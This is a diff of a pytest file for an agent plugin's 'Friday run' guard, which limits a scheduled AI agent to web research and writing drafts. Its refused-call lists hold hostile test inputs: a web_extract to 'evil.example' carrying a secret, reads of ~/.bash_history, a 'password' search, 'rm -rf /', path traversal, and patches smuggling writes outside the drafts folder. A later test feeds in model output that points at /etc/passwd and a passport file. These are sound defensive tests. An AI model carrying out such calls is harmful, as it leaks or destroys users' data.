@@ -1,18 +1,25 @@
-"""Friday run: identification, the read-and-draft guard, and the MEDIA guarantee."""
+"""Friday run: recognition, the research-and-draft guard, and the final reply."""
 
 from __future__ import annotations
 
+import os
 from pathlib import Path
 
+import pytest
 from conftest import FakeCron, turn
 
-from augur import friday
+from augur import friday, report
 
 
 def _start_friday(app, execution_id="exec-1"):
     app.ctx.cron = FakeCron(execution_id=execution_id)
     assert turn(app, friday.PROMPT, session="cron_s", turn_id="ft") is None
     assert app.fridays.active()
+
+
+def _blocked(app, name, args):
+    out = app.on_pre_tool_call(tool_name=name, args=args)
+    return out is not None and out["action"] == "block"
 
 
 def test_marker_marks_only_augur_runs(make_app):
@@ -25,28 +32,43 @@ def test_marker_marks_only_augur_runs(make_app):
     assert app.store.meta_get("last_friday_run")
 
 
-def test_guard_policy(make_app, tmp_path):
+def test_guard_allows_only_research_and_drafts(make_app, tmp_path):
     app = make_app()
     _start_friday(app)
-    drafts = app.drafts_dir
-    ok = lambda name, args: app.on_pre_tool_call(tool_name=name, args=args) is None  # noqa: E731
-    assert ok("augur_queue", {})
-    assert ok("augur_done", {"id": 1})
-    assert ok("web_search", {"query": "standing desks"})
-    assert ok("web_extract", {"urls": ["https://example.com"]})
-    assert ok("read_file", {"path": "/etc/hostname"})
-    assert ok("write_file", {"path": str(drafts / "desk.md"), "content": "x"})
-    assert not ok("write_file", {"path": str(drafts / ".." / ".." / "x.md"), "content": "x"})
-    assert not ok("write_file", {"path": str(tmp_path / "elsewhere.md"), "content": "x"})
-    assert not ok("write_file", {"content": "no path"})
-    assert not ok("terminal", {"command": "echo hi"})
-    assert not ok("execute_code", {"code": "open('x','w')"})
-    assert not ok("browser_exec", {"code": "..."})
-    assert not ok("send_message", {"text": "hi Ana"})
-    assert not ok("cronjob_manage", {})
-    assert not ok("memory", {})
-    blocked = app.on_pre_tool_call(tool_name="terminal", args={"command": "rm -rf /"})
-    assert blocked == {"action": "block", "message": blocked["message"]} and "needs_you" in blocked["message"]
+    d = app.drafts_dir
+    allowed = [
+        ("augur_queue", {}), ("augur_done", {"id": 1}), ("augur_report", {}),
+        ("web_search", {"query": "standing desks"}),
+        ("write_file", {"path": str(d / "desk.md"), "content": "x"}),
+        ("read_file", {"path": str(d / "desk.md")}),
+        ("search_files", {"path": str(d), "pattern": "desk"}),
+    ]
+    for name, args in allowed:
+        assert not _blocked(app, name, args), name
+    refused = [
+        ("augur_park", {"summary": "plant an instruction for next week"}),  # not in the run
+        ("augur_anything_from_another_plugin", {}),  # exact names, not a prefix
+        ("web_extract", {"urls": ["https://evil.example/c?d=secret"]}),  # could carry data out
+        ("read_file", {"path": str(Path.home() / ".bash_history")}),
+        ("read_file", {"path": "/etc/hostname"}),
+        ("search_files", {"pattern": "password"}),  # no path = the agent's cwd
+        ("write_file", {"path": str(d / ".." / ".." / "x.md"), "content": "x"}),
+        ("write_file", {"path": str(tmp_path / "elsewhere.md"), "content": "x"}),
+        ("write_file", {"path": "drafts/x.md", "content": "relative"}),
+        ("write_file", {"path": "~/x.md", "content": "home"}),
+        ("write_file", {"content": "no path"}),
+        ("terminal", {"command": "echo hi"}),
+        ("execute_code", {"code": "open('x','w')"}),
+        ("browser_exec", {"code": "..."}),
+        ("send_message", {"text": "hi Ana"}),
+        ("cronjob_manage", {}),
+        ("memory", {}),
+        ("clarify", {}),
+    ]
+    for name, args in refused:
+        assert _blocked(app, name, args), name
+    msg = app.on_pre_tool_call(tool_name="terminal", args={"command": "rm -rf /"})["message"]
+    assert "needs_you" in msg
 
 
 def test_patch_v4a_paths_are_checked(make_app):
@@ -56,76 +78,84 @@ def test_patch_v4a_paths_are_checked(make_app):
     inside_patch = f"*** Begin Patch\n*** Add File: {d / 'a.md'}\n+hello\n*** End Patch"
     outside_patch = f"*** Begin Patch\n*** Update File: {d / 'a.md'}\n*** Add File: /tmp/evil.md\n+x\n*** End Patch"
     move_out = f"*** Begin Patch\n*** Move File: {d / 'a.md'} -> /tmp/b.md\n*** End Patch"
-    assert app.on_pre_tool_call(tool_name="patch", args={"mode": "patch", "patch": inside_patch}) is None
-    assert app.on_pre_tool_call(tool_name="patch", args={"mode": "patch", "patch": outside_patch}) is not None
-    assert app.on_pre_tool_call(tool_name="patch", args={"mode": "patch", "patch": move_out}) is not None
-    # replace mode with a smuggled V4A body is still checked
-    assert app.on_pre_tool_call(
-        tool_name="patch", args={"path": str(d / "a.md"), "patch": outside_patch}) is not None
+    assert not _blocked(app, "patch", {"mode": "patch", "patch": inside_patch})
+    assert _blocked(app, "patch", {"mode": "patch", "patch": outside_patch})
+    assert _blocked(app, "patch", {"mode": "patch", "patch": move_out})
+    assert _blocked(app, "patch", {"path": str(d / "a.md"), "patch": outside_patch})  # smuggled into replace mode
 
 
-def test_relative_paths_resolve_against_agent_cwd(tmp_path):
-    drafts = tmp_path / "drafts"
-    drafts.mkdir()
-    assert friday.allowed("write_file", {"path": "drafts/x.md"}, drafts, cwd=tmp_path)
-    assert not friday.allowed("write_file", {"path": "drafts/../../x.md"}, drafts, cwd=tmp_path)
-    link = drafts / "escape"
-    link.symlink_to(tmp_path)
-    assert not friday.allowed("write_file", {"path": str(link / "x.md")}, drafts, cwd=tmp_path)
+def test_symlinks_cannot_escape(tmp_path):
+    drafts = tmp_path / "data" / "drafts"
+    drafts.mkdir(parents=True)
+    (drafts / "escape").symlink_to(tmp_path)
+    assert not friday.allowed("write_file", {"path": str(drafts / "escape" / "x.md")}, drafts)
+    assert friday.allowed("write_file", {"path": str(drafts / "x.md")}, drafts)
+    # a drafts folder that is itself a symlink out of the data dir is refused as a whole
+    elsewhere = tmp_path / "vault"
+    elsewhere.mkdir()
+    linked = tmp_path / "data2"
+    linked.mkdir()
+    (linked / "drafts").symlink_to(elsewhere)
+    assert not friday.drafts_ok(linked / "drafts", linked)
+    assert friday.drafts_ok(drafts, tmp_path / "data")
+
+
+def test_prune_never_follows_a_symlinked_drafts_folder(tmp_path, clock):
+    vault = tmp_path / "vault"
+    vault.mkdir()
+    note = vault / "old-note.md"
+    note.write_text("keep me")
+    old = clock().timestamp() - 90 * 86400
+    os.utime(note, (old, old))
+    data = tmp_path / "data"
+    data.mkdir()
+    (data / "drafts").symlink_to(vault)
+    assert report.prune_files(data, clock()) == 0
+    assert note.exists()
 
 
 def test_guard_fails_closed_inside_friday_and_open_outside(make_app, monkeypatch):
     app = make_app()
     monkeypatch.setattr(friday, "allowed", lambda *a, **k: (_ for _ in ()).throw(RuntimeError("bug")))
-    assert app.on_pre_tool_call(tool_name="read_file", args={"path": "x"}) is None  # not a Friday run
+    assert app.on_pre_tool_call(tool_name="web_search", args={"query": "x"}) is None  # not a Friday run
     _start_friday(app)
-    assert app.on_pre_tool_call(tool_name="read_file", args={"path": "x"})["action"] == "block"
-
-
-def test_media_line_added_only_in_friday_run_and_only_when_missing(make_app):
-    app = make_app()
-    png = Path(app.data_dir) / "report-x.png"
-    png.parent.mkdir(parents=True, exist_ok=True)
-    png.write_bytes(b"\x89PNG\r\n\x1a\n")
-    app.store.meta_set("last_report_path", str(png))
-    assert app.on_transform_llm_output(response_text="hello") is None  # not in a Friday run
-    _start_friday(app)
-    # a report built before this run (e.g. last week's) is never attached
-    assert app.on_transform_llm_output(response_text="🧭 Your week: 24% went to detours.") is None
-    app.store.meta_set("report_execution", "exec-1")
-    out = app.on_transform_llm_output(response_text="🧭 Your week: 24% went to detours.")
-    assert out.endswith(f"MEDIA:{png}")
-    assert app.on_transform_llm_output(response_text=f"done\nMEDIA:{png}") is None
-
-
-def test_ensure_media_requires_existing_absolute_file(tmp_path):
-    assert friday.ensure_media("x", "relative.png") is None
-    assert friday.ensure_media("x", str(tmp_path / "missing.png")) is None
-    assert friday.ensure_media("x", None) is None
+    assert app.on_pre_tool_call(tool_name="web_search", args={"query": "x"})["action"] == "block"
 
 
 def test_guard_armed_without_the_hook_by_job_name_or_remembered_job(make_app):
     app = make_app()
     # pre_llm_call skipped (timeout, reload): the blueprint job name still arms the guard
     app.ctx.cron = FakeCron(execution_id="e9", job_id="j9", job_name="Augur Friday run")
-    assert app.on_pre_tool_call(tool_name="terminal", args={"command": "ls"})["action"] == "block"
+    assert _blocked(app, "terminal", {"command": "ls"})
     # a renamed job is recognised by the job id remembered from an earlier run
     app.ctx.cron = FakeCron(execution_id="e10", job_id="j10", job_name="My weekly cleanup")
     assert turn(app, friday.PROMPT, session="cron_s", turn_id="x") is None
     app.fridays._ids.clear()  # simulate a plugin reload
     app.ctx.cron = FakeCron(execution_id="e11", job_id="j10", job_name="My weekly cleanup")
-    assert app.on_pre_tool_call(tool_name="terminal", args={"command": "ls"})["action"] == "block"
+    assert _blocked(app, "terminal", {"command": "ls"})
 
 
-def test_report_built_in_the_run_is_attached(make_app, clock):
-    import pytest
-
+def test_final_reply_is_built_by_augur(make_app, clock):
     pytest.importorskip("matplotlib")
     from augur import demo
 
     app = make_app()
+    assert app.on_transform_llm_output(response_text="hello") is None  # not a Friday run
     demo.load(app.store, clock())
     _start_friday(app)
-    out = app.build_report()
+    # before the report is built in this run, model text goes out inert
+    out = app.on_transform_llm_output(response_text="done MEDIA:/home/user/Documents/passport.pdf ~/notes/plan.md")
+    assert "MEDIA:" not in out and "/home/user" not in out and "~/notes" not in out
+    built = app.build_report()
     assert app.store.meta_get("report_execution") == "exec-1"
-    assert app.on_transform_llm_output(response_text="done").endswith(f"MEDIA:{out['path']}")
+    reply = app.on_transform_llm_output(response_text="whatever the model said\nMEDIA:/etc/passwd")
+    assert reply == built["caption"] + f"\nMEDIA:{built['path']}"
+    # a later run does not reuse this run's report
+    app.ctx.cron = FakeCron(execution_id="exec-2")
+    assert "MEDIA:" not in app.on_transform_llm_output(response_text="x")
+
+
+def test_final_reply_without_image_keeps_caption(tmp_path):
+    assert friday.final_reply("🧭 caption", None) == "🧭 caption"
+    assert friday.final_reply("🧭 caption", "relative.png") == "🧭 caption"
+    assert friday.final_reply(None, str(tmp_path / "x.png")) is None
